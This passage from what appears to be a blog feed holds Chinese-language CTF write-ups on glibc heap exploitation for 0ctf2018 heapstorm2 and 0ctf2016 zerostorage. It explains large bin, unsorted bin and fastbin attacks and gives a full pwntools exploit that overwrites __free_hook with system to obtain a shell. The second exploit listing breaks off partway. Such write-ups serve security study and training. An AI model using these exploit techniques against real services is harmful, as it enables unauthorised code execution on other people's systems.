bin上，使用一个正好的大小分配得到此chunk，对随机数和数组进行改写，最后修改<code>__free_hook</code>获得shell。</p><h3 id="null-byte-overflow"><a href="#null-byte-overflow" class="headerlink" title="null byte overflow"></a>null byte overflow</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 0</span></span><br><span class="line">allocate(<span class="number">0x400</span>)     <span class="comment"># 1</span></span><br><span class="line">allocate(<span class="number">0x28</span>)      <span class="comment"># 2</span></span><br><span class="line">allocate(<span class="number">0xf10</span>)     <span class="comment"># 3</span></span><br><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">3</span>, <span class="number">0xef8</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0xef0</span> + p64(<span class="number">0xf00</span>))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">update(<span class="number">2</span>, <span class="number">0x28</span><span class="number">-12</span>, <span class="string">b&quot;A&quot;</span>*(<span class="number">0x28</span><span class="number">-12</span>))</span><br><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 3</span></span><br><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 5</span></span><br><span class="line">allocate(<span class="number">0x400</span>)     <span class="comment"># 6</span></span><br><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 7</span></span><br><span class="line">allocate(<span class="number">0x400</span>)     <span class="comment"># 8</span></span><br><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>在3的内部构造后续使用的presize，释放3，溢出2覆盖3的size（0xf20-&gt;0xf00），然后分配一些块供后续使用。delete(4)后，这一大块合并入topchunk。</p><h3 id="large-bin-attack-1"><a href="#large-bin-attack-1" class="headerlink" title="large bin attack"></a>large bin attack</h3><p>null byte overflow后，unsorted bin中有：0x411-&gt;0x411-&gt;0x621。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x500</span>)     <span class="comment"># 3</span></span><br><span class="line">allocate(<span class="number">0x500</span>)     <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x80</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x58</span> + p64(<span class="number">0x401</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13370800</span><span class="number">-0x20</span>+<span class="number">3</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13370800</span>+<span class="number">8</span><span class="number">-0x20</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">allocate(<span class="number">0x20</span>)      <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x90</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x40</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + p64(<span class="number">0x13370800</span><span class="number">-0x10</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x48</span>)      <span class="comment"># 5</span></span><br></pre></td></tr></table></figure><p>分配块3，将0x621块割裂，并将两个0x411块放入到large bin中。再分配块4，就将从topchunk中割出，出现重叠。</p><p>通过对块4进行update，将large bin中的首块（称之为victim）内容进行了更新，将它的<code>victim-&gt;size</code>修改为0x401，<code>victim-&gt;bk</code>修改为<code>0x13370800-0x20+3</code>，<code>victim-&gt;bk_nextsize</code>修改为<code>0x13370800+8-0x20</code>。之后再有更大的chunk（称之为larger）进入large bin时，就将有以下操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;bk-&gt;fd = larger;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = larger;</span><br></pre></td></tr></table></figure><p>large bin attack之后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x133707e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x133707f0:0x55fb4c70300000000x0000000000000056</span><br><span class="line">0x13370800:0x3269f037bee796f90x00005655fb4c7030</span><br></pre></td></tr></table></figure><p>这时候，0x133707f0就能够当做一个chunk的起始地址。需要随机到heap最高有效字节为0x56，因为calloc分配完成后有检查。0x56就能够满足<code>chunk_is_mmapped (mem2chunk (mem))</code>这个条件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mem = _int_malloc (av, sz);</span><br><span class="line"></span><br><span class="line">assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||</span><br><span class="line">        av == arena_for_chunk (mem2chunk (mem)));</span><br></pre></td></tr></table></figure><h3 id="fake-unsorted-bin"><a href="#fake-unsorted-bin" class="headerlink" title="fake unsorted bin"></a>fake unsorted bin</h3><p>将unsorted bin中的某一chunk的fd、bk修改为0x133707f0，分配0x48就能将0x56的chunk分配出来。</p><p>unsorted bin从尾部往头部依次遍历，将其放入对应的bin或将其分配。从unsorted bin中取出时，有以下操作，所以得保证bk-&gt;fd是个可写的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><h3 id="后续操作"><a href="#后续操作" class="headerlink" title="后续操作"></a>后续操作</h3><p>改写数组，泄露heap_base地址，通过chunk中存储的bk、fd泄露libc_base，将<code>__free_hook</code>改成system地址。</p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/0ctf2018%20heapstorm2/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./heapstorm2&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">1</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">2</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">3</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">4</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    allocate(<span class="number">0x20</span>)      <span class="comment"># 0</span></span><br><span class="line">    allocate(<span class="number">0x400</span>)     <span class="comment"># 1</span></span><br><span class="line">    allocate(<span class="number">0x28</span>)      <span class="comment"># 2</span></span><br><span class="line">    allocate(<span class="number">0xf10</span>)     <span class="comment"># 3</span></span><br><span class="line">    allocate(<span class="number">0x20</span>)      <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">    update(<span class="number">3</span>, <span class="number">0xef8</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0xef0</span> + p64(<span class="number">0xf00</span>))</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    update(<span class="number">2</span>, <span class="number">0x28</span><span class="number">-12</span>, <span class="string">b&quot;A&quot;</span>*(<span class="number">0x28</span><span class="number">-12</span>))</span><br><span class="line">    allocate(<span class="number">0x20</span>)      <span class="comment"># 3</span></span><br><span class="line">    allocate(<span class="number">0x20</span>)      <span class="comment"># 5</span></span><br><span class="line">    allocate(<span class="number">0x400</span>)     <span class="comment"># 6</span></span><br><span class="line">    allocate(<span class="number">0x20</span>)      <span class="comment"># 7</span></span><br><span class="line">    allocate(<span class="number">0x400</span>)     <span class="comment"># 8</span></span><br><span class="line">    allocate(<span class="number">0x20</span>)      <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0x500</span>)     <span class="comment"># 3</span></span><br><span class="line">    allocate(<span class="number">0x500</span>)     <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">    update(<span class="number">4</span>, <span class="number">0x80</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x58</span> + p64(<span class="number">0x401</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13370800</span><span class="number">-0x20</span>+<span class="number">3</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13370800</span>+<span class="number">8</span><span class="number">-0x20</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    allocate(<span class="number">0x20</span>)      <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">    update(<span class="number">4</span>, <span class="number">0x90</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>))</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    update(<span class="number">4</span>, <span class="number">0x40</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + p64(<span class="number">0x13370800</span><span class="number">-0x10</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0x48</span>)      <span class="comment"># 5</span></span><br><span class="line">    update(<span class="number">5</span>, <span class="number">0x30</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x13377331</span>) + p64(<span class="number">0x13370830</span>) + p64(<span class="number">0x100</span>))</span><br><span class="line">    </span><br><span class="line">    update(<span class="number">0</span>, <span class="number">0x10</span>, p64(<span class="number">0x133707f3</span>) + p64(<span class="number">0x8</span>))</span><br><span class="line">    view(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Chunk[1]: &quot;</span>)</span><br><span class="line">    heap_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">    update(<span class="number">0</span>, <span class="number">0x10</span>, p64(heap_base+<span class="number">0x4a0</span>+<span class="number">0x10</span>) + p64(<span class="number">0x8</span>))</span><br><span class="line">    log.debug(<span class="string">&quot;heap: 0x%x&quot;</span> % (heap_base+<span class="number">0x4a0</span>+<span class="number">0x10</span>))</span><br><span class="line">    view(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Chunk[1]: &quot;</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x3ABC80</span></span><br><span class="line"></span><br><span class="line">    update(<span class="number">0</span>, <span class="number">0x10</span>, p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]) + p64(<span class="number">0x20</span>))</span><br><span class="line">    update(<span class="number">1</span>, <span class="number">0x8</span>, p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">    log.debug(<span class="string">&quot;system: 0x%x&quot;</span> % (libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b *$rebase(0x1331)&quot;)</span></span><br><span class="line">    update(<span class="number">0</span>, <span class="number">8</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol><li>how2heap large_bin_attack.c</li><li><a href="https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/">https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/</a></li><li><a href="https://eternalsakura13.com/2018/04/03/heapstorm2/">https://eternalsakura13.com/2018/04/03/heapstorm2/</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;large-bin-attack&quot;&gt;&lt;a href=&quot;#large-bin-attack&quot; class=&quot;headerlink&quot; title=&quot;large bin attack&quot;&gt;&lt;/a&gt;large bin attack&lt;/h2&gt;&lt;p&gt;对已存在于large bin中的chunk的bk、bk_nextsize字段进行更改，在unsorted bin中取出插入该large bin时，会将bk-&amp;gt;fd、bk_nextsize-&amp;gt;fd_nextsize的位置覆盖成chunk的地址。涉及的代码就是unsorted bin遍历取出插入那块。和先前的unsorted bin attack类似，通常为进一步攻击做准备，如修改global_max_fast。&lt;/p&gt;
&lt;p&gt;这里比较难理解就是large bin的结构，特别是先前我被一个&lt;a href=&quot;https://raw.githubusercontent.com/clxsh/pics/master/img/largebin.png&quot;&gt;large bin结构图&lt;/a&gt;所误导，下面给出我画的结构图（如果有错误o((⊙﹏⊙))o，请帮忙指出）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/clxsh/pics/master/img/large_bin2.png&quot; alt=&quot;glibc large bin&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;0ctf2018-heapstorm2&quot;&gt;&lt;a href=&quot;#0ctf2018-heapstorm2&quot; class=&quot;headerlink&quot; title=&quot;0ctf2018 heapstorm2&quot;&gt;&lt;/a&gt;0ctf2018 heapstorm2&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;功能分析&quot;&gt;&lt;a href=&quot;#功能分析&quot; class=&quot;headerlink&quot; title=&quot;功能分析&quot;&gt;&lt;/a&gt;功能分析&lt;/h3&gt;&lt;p&gt;程序首先使用mallopt函数将global_max_fast设置为0，也就是不使用fastbin。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--unsorted_bin_attack 0ctf2016--zerostorage</title>
    <link href="http://hhdx.xyz/2020/07/12/How2heap-unsorted-bin-attack-0ctf2016-zerostorage/"/>
    <id>http://hhdx.xyz/2020/07/12/How2heap-unsorted-bin-attack-0ctf2016-zerostorage/</id>
    <published>2020-07-12T02:01:35.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>对unsorted bin中的<code>chunk-&gt;bk</code>进行修改，接下来该chunk分配出去时，<code>chunk-&gt;bk-&gt;fd</code>就被赋值为unsortedbin头结点地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>在glibc2.28中增加了以下检查，使得此攻击失效。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure><p>unsorted bin attack通常为进一步的攻击做准备，比如覆写global_max_fast。</p><h2 id="0ctf2016-zerostorage"><a href="#0ctf2016-zerostorage" class="headerlink" title="0ctf2016 zerostorage"></a>0ctf2016 zerostorage</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>关键数据结构</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200712102723178.png" alt="image-20200712102723178"></p><p>flag：标识该节点是否存在</p><p>size：记录大小</p><p>content：数据块指针</p><p>程序有以下功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. Insert</span><br><span class="line">2. Update</span><br><span class="line">3. Merge</span><br><span class="line">4. Delete</span><br><span class="line">5. View</span><br><span class="line">6. List</span><br><span class="line">7. Exit</span><br></pre></td></tr></table></figure><p>insert：获取数据块大小，并读入数据。数据块大小在128~4096这个范围内</p><p>update：对数据块进行大小内容进行更新</p><p>merge：将两节点合并。这里存在漏洞，输入两次相同的id，导致UAF。这个漏洞我没发现，思维还不够猥琐啊</p><p>delete：释放数据块，清空节点</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>通过UAF，首先泄露libc基址，然后修改其bk指针，使用unsorted bin attack修改global_max_fast变量；fastbin bin attack覆写<code>__free_hook</code>为system函数地址。</p><a id="more"></a><h3 id="unsorted-bin-attack-1"><a href="#unsorted-bin-attack-1" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>merge函数中，from的指针将会被释放，to的指针赋值给新的块。而它没有检查from和to是否是一个数据块的情况，导致<strong>指针被赋值给新数据块，同时也被释放到unsorted bin中</strong>。</p><p>当它被释放到unsorted bin中时，fd、bk被填充，view该指针就获得了unsorted bin地址。</p><p>使用update函数将<code>global_max_fast-0x10</code>地址写入到其bk区域，分配一次后就将global_max_fast赋了一个很大的值，接下来只要不超过这个大小的chunk都会被当做fastbin处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uaf, leak libc base from unsorted bin</span></span><br><span class="line">insert(<span class="number">0x10</span>, <span class="string">b&quot;&quot;</span>)           <span class="comment"># 0</span></span><br><span class="line">insert(<span class="number">0x10</span>, <span class="string">b&quot;/bin/sh&quot;</span>)    <span class="comment"># 0, 1</span></span><br><span class="line">insert(<span class="number">0xf8</span>, <span class="string">b&quot;&quot;</span>)           <span class="comment"># 0, 1, 2</span></span><br><span class="line">merge(<span class="number">0</span>, <span class="number">0</span>)                 <span class="comment">#    1, 2, 3</span></span><br><span class="line">view(<span class="number">3</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x3ABC60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin attack</span></span><br><span class="line">maxfast_addr = libc_base + libc.sym[<span class="string">&quot;global_max_fast&quot;</span>]</span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *$rebase(0xCE8)&quot;</span>)     <span class="comment"># break at switch</span></span><br><span class="line">update(<span class="number">3</span>, <span class="number">0x10</span>, p64(<span class="number">0xdeadbeef</span>) + p64(maxfast_addr<span class="number">-0x10</span>))</span><br><span class="line">insert(<span class="number">0x80</span>, <span class="string">b&quot;&quot;</span>)           <span class="comment"># 0, 1, 2, 3</span></span><br></pre></td></tr></table></figure><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200712111119500.png" alt="image-20200712111119500"></p><p>通过以上命令可以看到<code>__free_hook</code>的低地址方向存在一个0x02，可以通过这个数据构造成<code>chunk-&gt;size=0x200</code>，如下所示。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200712111558299.png" alt="image-20200712111558299"></p><p>接下来的工作就是构造一个可以改写chunk-&gt;fd的、0x200的伪fastbin。</p><p>构造关键点：<strong>realloc函数中，在重新分配的大小大于原来且nextchunk是topchunk时，会直接从topchunk中切割所需大小。</strong>这样就避免了分配的出错。</p><p>所以一开始在topchunk分配<code>(0x200-0x10)/2=0xf8</code>，且接下来不再使用topchunk，unsorted bin attack之后，将它merge，就同时获得了修改该0x200chunk的能力，也被free到0x200的fastbin。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin attack</span></span><br><span class="line">merge(<span class="number">2</span>, <span class="number">2</span>)                 <span class="comment"># 0, 1,    3, 4</span></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x1f0</span>, p64(libc_base+<span class="number">0x3AD84F</span>))</span><br><span class="line">insert(<span class="number">0x1f0</span>, <span class="string">b&quot;&quot;</span>)          <span class="comment"># 0, 1, 2, 3, 4</span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">0x49</span> + p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">insert(<span class="number">0x1f0</span>, payload)      <span class="comment"># 0, 1, 2, 3, 4, 5</span></span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/0ctf2016%20zerostorage/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 